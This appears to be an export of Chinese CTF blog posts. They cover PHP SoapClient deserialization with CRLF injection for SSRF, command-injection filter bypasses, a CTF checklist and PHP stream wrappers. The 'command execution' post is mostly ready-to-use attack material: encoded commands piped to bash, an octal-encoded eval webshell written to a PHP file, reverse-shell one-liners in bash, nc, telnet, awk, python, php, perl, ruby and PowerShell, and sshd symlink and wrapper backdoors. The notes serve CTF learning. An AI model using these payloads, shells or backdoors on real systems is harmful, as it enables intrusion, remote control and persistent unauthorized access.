class="line">&#x2F;&#x2F;输出结果为php中内置的类及方法</span><br></pre></td></tr></table></figure>
<h3 id="SoapClient"><a href="#SoapClient" class="headerlink" title="SoapClient"></a>SoapClient</h3><h4 id="call方法"><a href="#call方法" class="headerlink" title="__call方法"></a><code>__call</code>方法</h4><p>正常情况下的<code>SoapClient</code>类，调用一个不存在的函数，会去调用<code>__call</code>方法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a &#x3D; new SoapClient(null,array(&#39;uri&#39;&#x3D;&gt;&#39;bbb&#39;, &#39;location&#39;&#x3D;&gt;&#39;http:&#x2F;&#x2F;ip:port&#x2F;path&#39;));</span><br><span class="line">$b &#x3D; serialize($a);</span><br><span class="line">echo $b;</span><br><span class="line">$c &#x3D; unserialize($b);</span><br><span class="line">$c-&gt;not_exists_function();</span><br></pre></td></tr></table></figure>
<p>在服务器或者虚拟机开启nc监听端口,就会收到SoapClient对象的http请求,携带着一段xml文本</p>
<p><a href="https://blogjpg.yanmy.top/blog/20200414/0YF4dgN2wFmy.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200414/0YF4dgN2wFmy.png?imageslim" alt="mark"></a></p>
<p><code>SOAPAction</code>处可控，可以把<code>\x0d\x0a</code>注入到<code>SOAPAction</code>，POST请求的header就可以被控制</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a &#x3D; new SoapClient(null,array(&#39;uri&#39;&#x3D;&gt;&quot;bbb\r\n\r\nccc\r\n&quot;, &#39;location&#39;&#x3D;&gt;&#39;http:&#x2F;&#x2F;ip:port&#x2F;path&#39;));</span><br><span class="line">$b &#x3D; serialize($a);</span><br><span class="line">echo $b;</span><br><span class="line">$c &#x3D; unserialize($b);</span><br><span class="line">$c-&gt;not_exists_function();</span><br></pre></td></tr></table></figure>
<p><a href="https://blogjpg.yanmy.top/blog/20200414/iNrDeQpFDpm5.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200414/iNrDeQpFDpm5.png?imageslim" alt="mark"></a></p>
<p>但<code>Content-Type</code>在<code>SOAPAction</code>的上面，就无法控制<code>Content-Typ</code>,也就不能控制POST的数据</p>
<p>在header里<code>User-Agent</code>在<code>Content-Type</code>前面</p>
<p><code>user_agent</code>同样可以注入<code>CRLF</code>，控制<code>Content-Type</code>的值</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$target &#x3D; &#39;http:&#x2F;&#x2F;127.0.0.1:5555&#x2F;path&#39;;</span><br><span class="line">$post_string &#x3D; &#39;data&#x3D;something&#39;;</span><br><span class="line">$headers &#x3D; array(</span><br><span class="line">    &#39;X-Forwarded-For: 127.0.0.1&#39;,</span><br><span class="line">    &#39;Cookie: PHPSESSID&#x3D;my_session&#39;</span><br><span class="line">    );</span><br><span class="line">$b &#x3D; new SoapClient(null,array(&#39;location&#39; &#x3D;&gt; $target,&#39;user_agent&#39;&#x3D;&gt;&#39;wupco^^Content-Type: application&#x2F;x-www-form-urlencoded^^&#39;.join(&#39;^^&#39;,$headers).&#39;^^Content-Length: &#39;.(string)strlen($post_string).&#39;^^^^&#39;.$post_string,&#39;uri&#39;      &#x3D;&gt; &quot;aaab&quot;));</span><br><span class="line"></span><br><span class="line">$aaa &#x3D; serialize($b);</span><br><span class="line">$aaa &#x3D; str_replace(&#39;^^&#39;,&quot;\r\n&quot;,$aaa);</span><br><span class="line">$aaa &#x3D; str_replace(&#39;&amp;&#39;,&#39;&amp;&#39;,$aaa);</span><br><span class="line">echo $aaa;</span><br><span class="line"></span><br><span class="line">$c &#x3D; unserialize($aaa);</span><br><span class="line">$c-&gt;not_exists_function();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><a href="https://blogjpg.yanmy.top/blog/20200414/86vKwz3yLHJW.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200414/86vKwz3yLHJW.png?imageslim" alt="mark"></a></p>
<p>如上，使用SoapClient反序列化+CRLF<strong>可以生成任意POST请求</strong>。</p>
<p><strong>Deserialization + __call + SoapClient + CRLF = SSRF</strong></p>
<h4 id="CTF题目"><a href="#CTF题目" class="headerlink" title="CTF题目"></a>CTF题目</h4><p><a href="https://link.zhihu.com/?target=https://github.com/Nu1LCTF/n1ctf-2018/tree/master/source/web/easy_harder_php">n1ctf2018 easy_harder_php</a></p>
<p>[SUCTF-2019 Upload Labs 2](<a href="https://github.com/team-su/SUCTF-2019/tree/master/Web/Upload">https://github.com/team-su/SUCTF-2019/tree/master/Web/Upload</a> Labs 2)</p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://www.anquanke.com/post/id/159206#h2-10">四个实例递进php反序列化漏洞理解</a></p>
<p><a href="https://paper.seebug.org/680/">利用 phar 拓展 php 反序列化漏洞攻击面</a></p>
<p><a href="https://mochazz.github.io/2019/02/02/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E4%B9%8Bphar/#%E4%BE%8B%E9%A2%98%E4%BA%8C">PHP反序列化入门之phar</a></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>命令执行的各种姿势</title>
    <url>/2020/03/12/CTF/linux%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E5%A7%BF%E5%8A%BF/</url>
    <content><![CDATA[<h1 id="命令执行的各种姿势"><a href="#命令执行的各种姿势" class="headerlink" title="命令执行的各种姿势"></a>命令执行的各种姿势</h1><p>比赛比的是组合拳,理解原理,灵活运用</p>
<a id="more"></a>

<h2 id="姿势"><a href="#姿势" class="headerlink" title="姿势"></a>姿势</h2><h3 id="一些命令分隔符"><a href="#一些命令分隔符" class="headerlink" title="一些命令分隔符"></a>一些命令分隔符</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Linux中：%0a(可以表示命令结束) 、%0d 、; 、&amp; 、| 、&amp;&amp;、||</span><br><span class="line">Windows中：%0a、&amp;、|、%1a（一个神奇的角色，作为.bat文件中的命令分隔符）</span><br></pre></td></tr></table></figure>
<h3 id="绕过空格"><a href="#绕过空格" class="headerlink" title="绕过空格"></a>绕过空格</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#下面这些都可以起到和空格样的作用</span><br><span class="line">&lt;,&lt;&gt;,%20(空格),%09(Tab),$IFS$9(也可以用$1等等,只是$9在linux始终为空字符),$&#123;IFS&#125;,$IFS</span><br></pre></td></tr></table></figure>
<h3 id="巧用花括号"><a href="#巧用花括号" class="headerlink" title="巧用花括号"></a>巧用花括号</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">在Linux bash中还可以使用&#123;OS_COMMAND,ARGUMENT&#125;来执行系统命令</span><br><span class="line">&#123;ls,&#125;</span><br><span class="line">Desktop Documents ...</span><br></pre></td></tr></table></figure>
<h3 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h3><h4 id="拼接绕过"><a href="#拼接绕过" class="headerlink" title="拼接绕过"></a>拼接绕过</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">比如：a&#x3D;l;b&#x3D;s;$a$b</span><br><span class="line">就相当于ls</span><br></pre></td></tr></table></figure>
<h4 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h4><h5 id="base64编码"><a href="#base64编码" class="headerlink" title="base64编码"></a>base64编码</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#注意,需要使用管道符,因为base64命令只接受标准的输入和输出</span><br><span class="line">echo &quot;Y2F0IC9mbGFn&quot;|base64-d|bash</span><br><span class="line">cat &#x2F;flag</span><br></pre></td></tr></table></figure>
<h5 id="Hex"><a href="#Hex" class="headerlink" title="Hex"></a>Hex</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#由于linux自动解析hex,所以可以使用hex绕过,\x20是空格,也可能被ban</span><br><span class="line"> &#x3D;&#x3D;&gt;cat &#x2F;flag</span><br></pre></td></tr></table></figure>
<h5 id="oct"><a href="#oct" class="headerlink" title="oct"></a>oct</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#&#123;&#125;或者()都可以$把这个输出当成变量,然后执行</span><br><span class="line">$(printf &quot;\154\163&quot;) </span><br><span class="line">&#x3D;&#x3D;&gt;ls</span><br><span class="line"></span><br><span class="line">$(printf &quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;) </span><br><span class="line">&#x3D;&#x3D;&gt;cat &#x2F;flag</span><br><span class="line"></span><br><span class="line">#可以通过这样来写webshell,内容为&lt;?php @eval($_POST[&#39;a&#39;]);?&gt;</span><br><span class="line">$&#123;printf,&quot;\74\77\160\150\160\40\100\145\166\141\154\50\44\137\120\117\123\124\133\47\143\47\135\51\73\77\76&quot;&#125; &gt;&gt; a.php</span><br><span class="line"></span><br><span class="line">#利用反引号&#96;</span><br><span class="line">&#96;printf &quot;\154\163&quot;&#96;</span><br><span class="line">--&gt;&gt;ls</span><br><span class="line"></span><br><span class="line">#绕过&#x2F;</span><br><span class="line">printf &quot;2f&quot;    </span><br><span class="line">&#x2F;</span><br><span class="line"></span><br><span class="line">或者可以从$PATH中取&#x2F;   </span><br><span class="line">echo $PATH|cut -c 1</span><br></pre></td></tr></table></figure>
<h5 id="单引号和双引号绕过，反斜杠绕过"><a href="#单引号和双引号绕过，反斜杠绕过" class="headerlink" title="单引号和双引号绕过，反斜杠绕过"></a>单引号和双引号绕过，反斜杠绕过</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ca&#39;&#39;t flag </span><br><span class="line">ca&quot;&quot;t flag  </span><br><span class="line">ca\t flag</span><br><span class="line">都相当于</span><br><span class="line">cat flag</span><br></pre></td></tr></table></figure>
<h5 id="长度限制"><a href="#长度限制" class="headerlink" title="长度限制"></a>长度限制</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">linux下可以用 &gt;a 创建文件名为a的空文件</span><br><span class="line">ls -t&gt;test则会将目录按时间排序后写进test文件中</span><br><span class="line">sh命令可以从一个文件中读取命令来执行</span><br><span class="line">https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;2748</span><br></pre></td></tr></table></figure>
<h5 id="利用Shell-特殊变量绕过"><a href="#利用Shell-特殊变量绕过" class="headerlink" title="利用Shell 特殊变量绕过"></a>利用Shell 特殊变量绕过</h5><table>
<thead>
<tr>
<th align="left">变量</th>
<th align="left">含义</th>
</tr>
</thead>
<tbody><tr>
<td align="left">$0</td>
<td align="left">当前脚本的文件名</td>
</tr>
<tr>
<td align="left">$n</td>
<td align="left">传递给脚本或函数的参数。n 是一个数字，表示第几个参数。例如，第一个参数是1，第二个参数是2。而参数不存在时其值为空。</td>
</tr>
<tr>
<td align="left">$#</td>
<td align="left">传递给脚本或函数的参数个数</td>
</tr>
<tr>
<td align="left">$*</td>
<td align="left">传递给脚本或函数的所有参数，而参数不存在时其值为空。</td>
</tr>
<tr>
<td align="left">$@</td>
<td align="left">传递给脚本或函数的所有参数。，而参数不存在时其值为空。被双引号包函时，与$*稍有不同</td>
</tr>
<tr>
<td align="left">$?</td>
<td align="left">上个命令的推出状态，或函数的返回值</td>
</tr>
<tr>
<td align="left">$$</td>
<td align="left">当前shell进程ID</td>
</tr>
</tbody></table>
<h5 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h5><p>详细参考<a href="http://www.ruanyifeng.com/blog/2018/09/bash-wildcards.html">阮一峰的网络日志——命令行通配符教程</a></p>
<table>
<thead>
<tr>
<th align="left">字符</th>
<th align="left">解释</th>
</tr>
</thead>
<tbody><tr>
<td align="left">*</td>
<td align="left">匹配任意长度任意字符</td>
</tr>
<tr>
<td align="left">？</td>
<td align="left">匹配任意单个字符</td>
</tr>
<tr>
<td align="left">[list]</td>
<td align="left">匹配指定范围内(list)任意单个字符，也可以是单个字符组成的集合</td>
</tr>
<tr>
<td align="left">[^list]</td>
<td align="left">匹配指定范围外的任意单个字符或字符集合</td>
</tr>
<tr>
<td align="left">[!list]</td>
<td align="left">同上</td>
</tr>
<tr>
<td align="left">{str1,str2}</td>
<td align="left">匹配str1或者str2字符，也可以是集合</td>
</tr>
<tr>
<td align="left">IFS</td>
<td align="left">由或或</td>
</tr>
<tr>
<td align="left">CR</td>
<td align="left">由产生</td>
</tr>
<tr>
<td align="left">!</td>
<td align="left">执行history中的命令</td>
</tr>
</tbody></table>
<p><strong>其中：</strong></p>
<ul>
<li>[…]表示匹配方括号之中的任意一个字符。<br>比如[aeiou]可以匹配五个元音字母，[a-z]匹配任意小写字母。</li>
<li>{…}表示匹配大括号里面的所有模式，模式之间使用逗号分隔。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo d&#123;a,e,i,u,o&#125;g</span><br><span class="line">dag deg dig dug dog</span><br><span class="line">#大括号可以嵌套使用</span><br><span class="line">echo &#123;j&#123;p,pe&#125;g,png&#125;</span><br><span class="line">jpg jpeg png</span><br><span class="line">#&#123;start..end&#125;匹配连续字符</span><br><span class="line">cat &#x2F;f&#123;a..z&#125;ag</span><br><span class="line">cat: &#x2F;faag: 没有那个文件或目录</span><br><span class="line">cat: &#x2F;fbag: 没有那个文件或目录</span><br><span class="line">cat: &#x2F;fcag: 没有那个文件或目录</span><br><span class="line">cat: &#x2F;fdag: 没有那个文件或目录</span><br><span class="line">cat: &#x2F;feag: 没有那个文件或目录</span><br><span class="line">cat: &#x2F;ffag: 没有那个文件或目录</span><br><span class="line">cat: &#x2F;fgag: 没有那个文件或目录</span><br><span class="line">cat: &#x2F;fhag: 没有那个文件或目录</span><br><span class="line">cat: &#x2F;fiag: 没有那个文件或目录</span><br><span class="line">cat: &#x2F;fjag: 没有那个文件或目录</span><br><span class="line">cat: &#x2F;fkag: 没有那个文件或目录</span><br><span class="line">flag&#123;test&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<ul>
<li>{…}与[…]有一个很重要的区别。如果匹配的文件不存在，[…]会失去模式的功能，变成一个单纯的字符串，而{…}依然可以展开。</li>
</ul>
<p>通配符有时可以起奇效</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat fla* </span><br><span class="line">cat$&#123;IFS&#125;fl*</span><br></pre></td></tr></table></figure>
<p>**注意:**又是还会遇到flag 的贪婪匹配<code>/.*f*.l*.a*.g*/</code>这是拼接什么的基本不能用,就不得不考虑编码等其他姿势</p>
<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>目标机执行反弹shell的命令,攻击机用nc开启监听就行</p>
<h3 id="攻击机"><a href="#攻击机" class="headerlink" title="攻击机"></a>攻击机</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvvp 8080</span><br></pre></td></tr></table></figure>
<h3 id="目标机"><a href="#目标机" class="headerlink" title="目标机"></a>目标机</h3><h4 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.1168.0.1&#x2F;8080 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
<h4 id="exec"><a href="#exec" class="headerlink" title="exec"></a>exec</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">exec 5&lt;&gt;&#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port;cat &lt;&amp;5|while read line;do $line &gt;&amp;5 2&gt;&amp;1;done</span><br></pre></td></tr></table></figure>
<h4 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">受害主机执行:</span><br><span class="line">ln -sf &#x2F;usr&#x2F;sbin&#x2F;sshd &#x2F;tmp&#x2F;su;&#x2F;tmp&#x2F;su -oPort&#x3D;8080;   </span><br><span class="line"></span><br><span class="line">攻击机器:</span><br><span class="line">ssh root@192.168.3.251 -p 8080 [用户名root,密码随意]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">简易SSH wrapper后门(原理未测试)</span><br><span class="line">受害主机执行:</span><br><span class="line">cd &#x2F;usr&#x2F;sbin</span><br><span class="line">mv sshd ..&#x2F;bin</span><br><span class="line">echo &#39;#!&#x2F;usr&#x2F;bin&#x2F;perl&#39; &gt; sshd</span><br><span class="line">echo &#39;exec &quot;&#x2F;bin&#x2F;sh&quot; if (getpeername(STDIN) &#x3D;~ &#x2F;^..4A&#x2F;);&#39; &gt;&gt;sshd</span><br><span class="line">echo &#39;exec &#123;&quot;&#x2F;usr&#x2F;bin&#x2F;sshd&quot;&#125; &quot;&#x2F;usr&#x2F;sbin&#x2F;sshd&quot;,@ARGV,&#39; &gt;&gt;sshd</span><br><span class="line">chmod u+x sshd</span><br><span class="line">&#x2F;etc&#x2F;init.d&#x2F;sshd restart</span><br><span class="line"></span><br><span class="line">攻击机器:</span><br><span class="line">socat STDIO TCP4:x.x.x.x:22,souceport&#x3D;13337</span><br></pre></td></tr></table></figure>
<h4 id="NC反弹"><a href="#NC反弹" class="headerlink" title="NC反弹"></a>NC反弹</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#nc 如果安装了正确的版本（存在-e 选项就能直接反弹shell）</span><br><span class="line">nc -e &#x2F;bin&#x2F;sh ip port</span><br><span class="line"></span><br><span class="line">#受害主机:</span><br><span class="line">rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc x.x.x.x 8080 &gt; &#x2F;tmp&#x2F;f</span><br><span class="line"></span><br><span class="line">#攻击主机先监听8080端口:</span><br><span class="line">nc -lvvp 8080</span><br><span class="line"></span><br><span class="line">#类似的命令</span><br><span class="line">mknod backpipe p;nc ip prot 0&lt;backpipe | &#x2F;bin&#x2F;bash 1&gt;backpipe 2&gt;backpipe</span><br></pre></td></tr></table></figure>
<h4 id="Awk"><a href="#Awk" class="headerlink" title="Awk"></a>Awk</h4><p>**注意:**攻击的机器监听，在收到shell的时候不可以只输入enter，不然会断开</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">awk &#39;BEGIN&#123;s&#x3D;&quot;&#x2F;inet&#x2F;tcp&#x2F;0&#x2F;ip&#x2F;port&quot;;for(;s|&amp;getline c;close(c))while(c|getline)print|&amp;s;close(s)&#125;&#39;</span><br></pre></td></tr></table></figure>
<h4 id="Telnet反弹"><a href="#Telnet反弹" class="headerlink" title="Telnet反弹"></a>Telnet反弹</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">受害主机:</span><br><span class="line">telnet 192.168.3.251 8080 | &#x2F;bin&#x2F;bash | telnet 192.168.3.251 1080</span><br><span class="line">攻击主机:</span><br><span class="line">nc -lvp 1080 </span><br><span class="line">nc -lvp 8080 &#x2F;&#x2F;这里输入命令可以在1080看到结果</span><br><span class="line"></span><br><span class="line">受害机器:</span><br><span class="line">mknod test p &amp;&amp; telnet ip  port 0&lt;test | &#x2F;bin&#x2F;bash 1&gt;test</span><br><span class="line">攻击：</span><br><span class="line">nc  -lvvp 8080</span><br><span class="line">top命令看不到结果，因为不是tty</span><br></pre></td></tr></table></figure>
<h4 id="python"><a href="#python" class="headerlink" title="python"></a>python</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;ip&quot;,port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-i&quot;]);&#39;</span><br><span class="line"></span><br><span class="line">#还可以配合ssti注入执行bash反弹</span><br></pre></td></tr></table></figure>
<h4 id="php"><a href="#php" class="headerlink" title="php"></a>php</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php -r &#39;$sock&#x3D;fsockopen(&quot;ip&quot;,port);exec(&quot;&#x2F;bin&#x2F;bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</span><br></pre></td></tr></table></figure>
<h4 id="Perl"><a href="#Perl" class="headerlink" title="Perl"></a>Perl</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">perl -e &#39;use Socket;$i&#x3D;&quot;ip&quot;;$p&#x3D;prot;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;&#x2F;bin&#x2F;bash -i&quot;);&#125;;&#39;</span><br></pre></td></tr></table></figure>
<h4 id="Ruby"><a href="#Ruby" class="headerlink" title="Ruby"></a>Ruby</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ruby -rsocket -e &#39;exit if fork;c&#x3D;TCPSocket.new(&quot;ip&quot;,&quot;port&quot;);while(cmd&#x3D;c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#39;</span><br></pre></td></tr></table></figure>
<h4 id="Windwos"><a href="#Windwos" class="headerlink" title="Windwos"></a>Windwos</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">WIndows</span><br><span class="line">PS C:\&gt; Import-Module .\powercat.ps1</span><br><span class="line">PS C:\&gt; powercat -c 192.168.3.251 -p 8081 -e cmd -g &gt;&gt; payload.ps1</span><br><span class="line"># nc -lvp 8081 然后开始监听payload回连的端口</span><br><span class="line"></span><br><span class="line">powershell –exec bypass –Command &quot;&amp; &#123;Import-Module &#39;C:\payload.ps1&#39;&#125;&quot;</span><br><span class="line">#挂在后台执行</span><br></pre></td></tr></table></figure>
<h2 id="查看内容命令"><a href="#查看内容命令" class="headerlink" title="查看内容命令"></a>查看内容命令</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat、tac、more、less、head、tail、nl、sed、sort、uniq</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>CTF</category>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF_note</title>
    <url>/2019/07/16/CTF/ctf%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h2><p>题目hint很重要，再看html元素和js有无提示，根据网站操作演练一遍，发现页面回显和可疑之处。</p>
<a id="more"></a>

<h2 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h2><p>看头和表单数据。</p>
<h2 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h2><p>看robots.txt</p>
<h2 id="4"><a href="#4" class="headerlink" title="4."></a>4.</h2><p>扫查看是否有可疑之处。</p>
<h2 id="5"><a href="#5" class="headerlink" title="5."></a>5.</h2><h3 id="常见漏洞总结："><a href="#常见漏洞总结：" class="headerlink" title="常见漏洞总结："></a>常见漏洞总结：</h3><p> 1.文件包含漏洞 …/./进行跨目录</p>
<p> 2.md5碰撞，base64加密，==判断传数组</p>
<p> 3.cookies参数，seesionID保证数据不刷新</p>
<p> 4.Refer和X-Forward要求本地</p>
<h1 id="mirc"><a href="#mirc" class="headerlink" title="mirc"></a>mirc</h1><h2 id="1-文件隐写"><a href="#1-文件隐写" class="headerlink" title="1.文件隐写"></a>1.文件隐写</h2><p> 1.文件包含，jpg包含zip，docx包含zip。注意查看document文件夹和目录下document文件。</p>
<p> 2.文件头，gif，png，exif，jiff格式损坏复原。</p>
<p> 3.文件尾数据可疑%url编码，大小写字母base编码，数字转换进制。</p>
<p> 4.文件属性隐藏密码和数据。</p>
<p> 5.mp3文件隐藏数据，密码如3.4.查询</p>
<p> 6.二维码反转，图片过滤色差。</p>
<p> 7.图片显示不全，一搬为png，更改宽度和高度一致</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">8.zip密码爆破</span><br></pre></td></tr></table></figure>
<p> 9.dd分离文件，参数说明:、</p>
<p> if inputfile 输入文件</p>
<p> of outputfile 输出文件</p>
<p> skip 跳过多少字节分离</p>
<p> ibs 读取文件速率</p>
<p> obs 输出文件速率</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP伪协议</title>
    <url>/2020/03/16/CTF/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
    <content><![CDATA[<h1 id="PHP伪协议"><a href="#PHP伪协议" class="headerlink" title="PHP伪协议"></a>PHP伪协议</h1><h2 id="0x00-何为伪协议"><a href="#0x00-何为伪协议" class="headerlink" title="0x00 何为伪协议"></a>0x00 何为伪协议</h2><p>PHP官网的解释:</p>
<p>PHP 带有很多内置 URL 风格的封装协议，可用于类似 <a href="https://www.php.net/manual/zh/function.fopen.php">fopen()</a>、 <a href="https://www.php.net/manual/zh/function.copy.php">copy()</a>、 <a href="https://www.php.net/manual/zh/function.file-exists.php">file_exists()</a> 和 <a href="https://www.php.net/manual/zh/function.filesize.php">filesize()</a> 的文件系统函数。 除了这些封装协议，还能通过 <a href="https://www.php.net/manual/zh/function.stream-wrapper-register.php">stream_wrapper_register()</a> 来注册自定义的封装协议。</p>
<a id="more"></a>

<p><strong>支持的协议:</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file:&#x2F;&#x2F; — 访问本地文件系统</span><br><span class="line">http:&#x2F;&#x2F; — 访问 HTTP(s) 网址</span><br><span class="line">ftp:&#x2F;&#x2F; — 访问 FTP(s) URLs</span><br><span class="line">php:&#x2F;&#x2F; — 访问各个输入&#x2F;输出流（I&#x2F;O streams）</span><br><span class="line">zlib:&#x2F;&#x2F; — 压缩流</span><br><span class="line">data:&#x2F;&#x2F; — 数据（RFC 2397）</span><br><span class="line">glob:&#x2F;&#x2F; — 查找匹配的文件路径模式</span><br><span class="line">phar:&#x2F;&#x2F; — PHP 归档</span><br><span class="line">ssh2:&#x2F;&#x2F; — Secure Shell 2</span><br><span class="line">rar:&#x2F;&#x2F; — RAR</span><br><span class="line">ogg:&#x2F;&#x2F; — 音频流</span><br><span class="line">expect:&#x2F;&#x2F; — 处理交互式的流</span><br></pre></td></tr></table></figure>
<h2 id="0x01-用法"><a href="#0x01-用法" class="headerlink" title="0x01 用法"></a>0x01 用法</h2><h3 id="file"><a href="#file" class="headerlink" title="file://"></a>file://</h3><blockquote>
<p>PHP.ini：<br>file:// 协议在双off的情况下也可以正常使用；<br>allow_url_fopen ：off/on<br>allow_url_include：off/on</p>
</blockquote>
<p><strong>file:// 用于访问本地文件系统，在CTF中通常用来读取本地文件</strong></p>
<p><strong>且不受allow_url_fopen与allow_url_include的影响</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;file.php</span><br><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#39;file&#39;]))</span><br><span class="line">&#123;</span><br><span class="line">    include $_GET[&#39;file&#39;];</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&#x2F;&#x2F;使用file:&#x2F;&#x2F; [文件的绝对路径和文件名]来访问文件</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;file.php?file&#x3D;&#x2F;var&#x2F;www&#x2F;&#x2F;html&#x2F;phpinfo.php</span><br></pre></td></tr></table></figure>
<h3 id="php"><a href="#php" class="headerlink" title="php://"></a>php://</h3><blockquote>
<p><strong>php://filter在双off的情况下也可以正常使用；</strong><br><strong>php://input、 php://stdin、 php://memory 和 php://temp 需要开启allow_url_include。</strong></p>
</blockquote>
<p><strong>php:// 访问各个输入/输出流（I/O streams）</strong></p>
<p><strong>在CTF中经常使用的是php://filter和php://input</strong></p>
<ul>
<li><strong>php://filter用于读取源码</strong></li>
<li><strong>php://input用于执行php代码。</strong></li>
</ul>
<h4 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h4><p><code>php://filter</code> 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">resource&#x3D;&lt;要过滤的数据流&gt;   这个参数是必须的。它指定了你要筛选过滤的数据流。</span><br><span class="line">read&#x3D;&lt;读链的筛选列表&gt;       该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</span><br><span class="line">write&#x3D;&lt;写链的筛选列表&gt;      该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</span><br><span class="line">&lt;;两个链的筛选列表&gt;         任何没有以 read&#x3D; 或 write&#x3D; 作前缀 的筛选器列表会视情况应用于读或写链。</span><br><span class="line">php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php</span><br><span class="line">&#x2F;&#x2F;可以以base64编码的方式读取index.php的内容</span><br></pre></td></tr></table></figure>
